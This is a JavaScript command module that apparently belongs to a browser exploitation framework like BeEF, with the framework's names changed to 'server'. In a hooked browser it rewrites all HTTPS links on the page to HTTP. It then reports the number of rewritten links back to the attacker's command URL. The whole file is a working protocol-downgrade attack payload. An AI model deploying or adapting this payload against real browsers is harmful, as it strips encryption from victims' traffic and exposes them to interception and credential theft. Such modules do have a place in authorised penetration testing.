//
// Copyright (c) 2006-2025 Wade Alcorn - wade@bindshell.net
// Browser Exploitation Framework (Server) - https://serverproject.com
// See the file 'doc/COPYING' for copying permission
//

server.execute(function() {

	selector = "a";
	old_protocol = "https";
	new_protocol = "http";

	server.net.send('<%= @command_url %>', <%= @command_id %>, 'result='+server.dom.rewriteLinksProtocol(old_protocol, new_protocol, selector)+' '+old_protocol+' links rewritten to '+new_protocol);

});

